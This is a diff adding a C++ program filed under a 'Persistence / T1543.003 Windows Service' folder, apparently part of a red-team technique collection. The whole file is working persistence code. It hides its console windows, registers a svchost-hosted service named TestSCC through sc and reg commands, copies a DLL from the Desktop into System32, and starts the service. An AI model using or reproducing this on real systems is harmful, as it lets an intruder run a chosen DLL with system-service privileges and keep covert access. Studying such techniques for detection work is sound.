@@ -1,0 +1,58 @@
+---
+title: "TestSCC EXE"
+folder: "05. Persistence/T1543.003.Windows Service"
+---
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+
+
+void StartService() {
+
+    const char* command1 = "sc create TestSCC binpath= \"c:\\Windows\\system32\\svchost.exe -k TestSCC\"";
+    const char* command2 = "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\TestSCC\\Parameters\" /v \"ServiceDll\" /t REG_EXPAND_SZ /d \"C:\\Windows\\system32\\TestSCC.dll\" /f";
+    const char* command3 = "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v \"TestSCC\" /t REG_MULTI_SZ /d \"TestSCC\" /f";
+    const char* command4 = "sc.exe start TestSCC";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command1), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command2), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command3), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+    std::ifstream src("C:\\Users\\User\\Desktop\\TestSCC.dll", std::ios::binary);
+    std::ofstream dest("C:\\Windows\\System32\\TestSCC.dll", std::ios::binary);
+    dest << src.rdbuf();
+    src.close();
+    dest.close();
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command4), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+}
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    StartService();
+    return 0;
+}
